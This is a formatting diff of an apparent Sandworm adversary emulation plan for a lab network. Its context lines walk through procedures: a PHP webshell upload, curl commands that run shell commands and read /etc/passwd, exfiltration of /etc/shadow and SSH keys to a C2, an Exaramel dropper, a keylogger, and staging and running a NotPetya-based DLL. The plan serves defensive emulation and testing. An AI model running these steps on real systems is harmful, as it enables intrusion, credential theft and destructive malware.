@@ -36,7 +36,7 @@ System: 10.0.1.5 / caladan
 C2:	192.168.0.4 connects to 10.0.1.5:443 via HTTPS (self signed cert)
 ```
 
-### ☣️ Procedures
+#### ☣️ Procedures
 
 Upload P.A.S. webshell to caladan/10.0.1.5 as `/tmp/search.php`.
 
@@ -62,11 +62,11 @@ ssh fherbert@10.0.1.5 "sudo mv /tmp/search.php /var/www/html/"
 
 [Source Code - Obfuscated](../../Resources/phpWebShell/obfuscated_webShell.php)
 
-### :microscope: Cited Intelligence
+#### :microscope: Cited Intelligence
 
-* https://www.us-cert.gov/ics/alerts/IR-ALERT-H-16-056-01
+* <https://www.us-cert.gov/ics/alerts/IR-ALERT-H-16-056-01>
 
-* https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf
+* <https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf>
 
 <br>
 
@@ -78,7 +78,7 @@ Sandworm enumerates information about the compromised system by issuing shell co
 
 Executed commands include whoami, uname, ls, among others.
 
-### ☣️ Procedures
+#### ☣️ Procedures
 
 Execute `whoami` from P.A.S. webshell.
 
@@ -118,11 +118,11 @@ curl --insecure "https://10.0.1.5/search.php?cmd=cat+/etc/passwd"
 
 [Source Code](../../Resources/phpWebShell/webShell.php#L35)
 
-### :microscope: Cited Intelligence
+#### :microscope: Cited Intelligence
 
-* https://www.justice.gov/opa/press-release/file/1328521/download 
+* <https://www.justice.gov/opa/press-release/file/1328521/download>
 
-* https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/
+* <https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/>
 
 <br>
 
@@ -150,7 +150,7 @@ Protocol: HTTPS
 File write: /var/www/html/centreon_module_linux_app64
 ```
 
-### ☣️ Procedures
+#### ☣️ Procedures
 
 :warning: Open a new terminal tab (ctrl+shift+t) and start the control server.
 
@@ -202,9 +202,9 @@ curl --insecure "https://10.0.1.5/search.php?cmd=/bin/backup" &
 
 :warning: Switch to your controlServer tab; you should have a new callback.
 
-### :microscope: Cited Intelligence
+#### :microscope: Cited Intelligence
 
-* https://www.justice.gov/opa/press-release/file/1328521/download 
+* <https://www.justice.gov/opa/press-release/file/1328521/download>
 
 <br>
 
@@ -218,7 +218,7 @@ Sandworm then exfils /etc/shadow, bash history, and fherbert's SSH keys over the
 
 In the next step, Sandworm uses credentials derived from the /etc/shadow file to attack a lateral host.
 
-### ☣️ Procedures
+#### ☣️ Procedures
 
 From your control server tab, split the window horizontally:
 
@@ -294,11 +294,11 @@ Confirm SSH keys are present on attack platform:
 ls -lsah files/
 ```
 
-### :microscope: Cited Intelligence
+#### :microscope: Cited Intelligence
 
-* https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/
+* <https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/>
 
-* https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf
+* <https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf>
 
 <br>
 
@@ -310,7 +310,7 @@ ls -lsah files/
 
 During this step, Sandworm uses credentials gained from step4 to move laterally to gammu/10.0.1.7 as local admin user fherbert.
 
-The way this works is Sandworm first uploads an Exaramel dropper to disk using smbclient with valid credentials. 
+The way this works is Sandworm first uploads an Exaramel dropper to disk using smbclient with valid credentials.
 
 The Exaramel dropper is uploaded to `C:\\Windows\\wsmprovav.exe`.
 
@@ -348,7 +348,7 @@ Exaramel-Windows C2: 192.168.0.4:443 HTTPS
 
 ```
 
-### ☣️ Procedures
+#### ☣️ Procedures
 
 :warning: If you do not already have the Control Server from Step 13 running, execute the following. Otherwise, skip to the next :warning:.
 
@@ -435,15 +435,15 @@ The dropper will download Exaramel-Windows over HTTP. The dropper then executes 
 
 :warning: Switch to your control server terminal; you should have a new C2 session from Exaramel-Windows.
 
-### :microscope: Cited Intelligence
+#### :microscope: Cited Intelligence
 
-* https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html
+* <https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html>
 
-* https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/
+* <https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/>
 
-* https://blog.talosintelligence.com/2018/02/olympic-destroyer.html
+* <https://blog.talosintelligence.com/2018/02/olympic-destroyer.html>
 
-* https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/
+* <https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/>
 
 <br>
 
@@ -453,7 +453,7 @@ The dropper will download Exaramel-Windows over HTTP. The dropper then executes 
 
 Using the Exaramel-Windows C2 channel, Sandworm obtains the current username, OS version, performs a recursive file listing, and queries for RDP connections.
 
-### ☣️ Procedures
+#### ☣️ Procedures
 
 Place your cursor on the second pane in the control server window.
 
@@ -499,13 +499,13 @@ Look for RDP connections.
 
 [Source Code](../../Resources/Exaramel-Windows/taskhandler/taskhandler.go#L17)
 
-### :microscope: Cited Intelligence
+#### :microscope: Cited Intelligence
 
-* https://www.justice.gov/opa/press-release/file/1328521/download
+* <https://www.justice.gov/opa/press-release/file/1328521/download>
 
-* https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/
+* <https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/>
 
-* https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/
+* <https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/>
 
 <br>
 
@@ -532,7 +532,7 @@ Sandworm obtains domain admin credentials by keylogging an RDP session from a va
 
 Sandworm then gets a list of all domain hosts using dsquery.
 
-### ☣️ Procedures
+#### ☣️ Procedures
 
 Upload the webCredDumper to gammu over Exaramel-Windows C2 channel (HTTPS / 192.168.0.4:443):
 
@@ -568,7 +568,7 @@ Execute the keylogger, logging keystrokes to mslog.txt.
 
 Now we will exercise the keylogger.
 
-:warning: Switch to the gammu-RDP-session window. 
+:warning: Switch to the gammu-RDP-session window.
 
 Open the Windows RDP client on Gammu and *manually* type the following:
 
@@ -642,11 +642,11 @@ Cleanup artifacts.
 
 :warning: Go back to the gammu RDP session; right-click sign-out.
 
-### :microscope: Cited Intelligence
+#### :microscope: Cited Intelligence
 
-* https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/
+* <https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/>
 
-* https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/
+* <https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/>
 
 <br>
 
@@ -664,9 +664,9 @@ Sandworm uploads a DLL based on NotPetya to arrakis (C:\Windows\perfc.dat) over 
 File write: C:\Windows\perfc.dat
 ```
 
-### ☣️ Procedures
+#### ☣️ Procedures
 
-:warning: go back to your first terminal window; rename to RDP into arrakis. 
+:warning: go back to your first terminal window; rename to RDP into arrakis.
 
 RDP into arrakis/domain controller using domain admin credentials.
 
@@ -690,13 +690,13 @@ copy \\TSCLIENT\X\SharpNP.dll C:\Windows\perfc.dat
 
 Delete the RDP network share:
 
-### :microscope: Cited Intelligence
+#### :microscope: Cited Intelligence
 
-* https://www.justice.gov/opa/press-release/file/1328521/download
+* <https://www.justice.gov/opa/press-release/file/1328521/download>
 
-* https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/
+* <https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/>
 
-* https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/
+* <https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/>
 
 <br>
 
@@ -714,8 +714,7 @@ NotPetya drops a ransom note in C:\README.txt.
 
 NotPetya copies and executes itself on 10.0.1.8.
 
-
-### ☣️ Procedures
+#### ☣️ Procedures
 
 ```bash
 # NotPetya is executed using rundll32. #1 - is the first function exported in the DLL
@@ -762,13 +761,12 @@ Enter-PsSession -ComputerName quadra
 type C:\Users\Public\Documents\Whitepaper_ekFUNt.rtf
 ```
 
-### :microscope: Cited Intelligence
+#### :microscope: Cited Intelligence
 
-* https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html
+* <https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html>
 
-* https://www.us-cert.gov/ncas/alerts/TA17-181A
+* <https://www.us-cert.gov/ncas/alerts/TA17-181A>
 
-* https://www.justice.gov/opa/press-release/file/1328521/download
+* <https://www.justice.gov/opa/press-release/file/1328521/download>
 
 <br>
-
